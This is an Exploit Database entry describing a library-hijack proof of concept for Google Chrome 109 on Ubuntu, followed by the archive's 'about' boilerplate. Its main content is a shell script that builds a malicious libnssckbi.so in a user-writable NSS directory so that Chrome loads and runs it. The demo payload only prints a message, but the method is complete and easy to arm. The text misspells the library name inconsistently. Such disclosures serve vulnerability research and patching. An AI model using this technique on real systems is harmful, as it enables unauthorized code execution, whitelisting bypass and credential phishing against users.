#Exploit Title: Google Chrome  109.0.5414.74 - Code Execution via missing lib file (Ubuntu)
Product: Google Chrome
Discovered by: Rafay Baloch and Muhammad Samak
#Version: 109.0.5414.74
#Impact: Moderate
#Company: Cyber Citadel
#Website: https://www.cybercitadel.com
#Tested-on : Ubuntu 22.04.1

*Description*

Google chrome attempts to load the 'libssckbi.so' file from a user-writable location.
PATH: /home/$username/.pki/nssdb/libnssckbi.so
Since the Shared Library 'ibnssckbi.so' specified path is writeable.
It is possible to achieve the Code Execution by placing the malicious file with
the name `libnssckbi.so` in the specified path.

*exploit*

Following is the POC that could be used to reproduce the issue:

echo "\n\t\t\tGoogle-Chrome Shared Library Code Execution..."
echo "[*] Checking /.pki/nssdb PATH"
if [ -d "/home/haalim/.pki/nssdb" ]
then

	echo "[+] Directory Exists..."
	if [ -w "/home/haalim/.pki/nssdb" ]
	then
    echo "[+] Directory is writable..."

		echo "[+] Directory is writable..."
		echo "[+] Generating malicious File libnssckbi.so ..."
			echo "#define _GNU_SOURCE" > /home/haalim/.pki/nssdb/exploit.c
			echo "#include <unistd.h>" >> /home/haalim/.pki/nssdb/exploit.c
			echo "#include <stdio.h>" >> /home/haalim/.pki/nssdb/exploit.c
			echo "#include <stdlib.h>" >> /home/haalim/.pki/nssdb/exploit.c
			echo "void f() {" >> /home/haalim/.pki/nssdb/exploit.c
			echo 'printf("Code Executed............ TMGM :)\n");' >> /home/haalim/.pki/nssdb/exploit.c
			echo "}" >> /home/haalim/.pki/nssdb/exploit.c
			gcc -c -Wall -Werror -fpic /home/haalim/.pki/nssdb/exploit.c -o /home/haalim/.pki/nssdb/exploit.o
			gcc -shared -o /home/haalim/.pki/nssdb/libnssckbi.so -Wl,-init,f /home/haalim/.pki/nssdb/exploit.o

Upon closing the browser windows, the application executes the malicious code

*Impact*

The attacker can use this behavior to bypass the application whitelisting rules.
This behavior can also lead to DoS attacks.
An attacker can trick a victim into supplying credentials by creating a fake prompt.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/?utm_source=edb&utm_medium=web&utm_campaign=www), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/?utm_source=edb&utm_medium=web&utm_campaign=www) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/?utm_source=edb&utm_medium=web&utm_campaign=www) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a p...
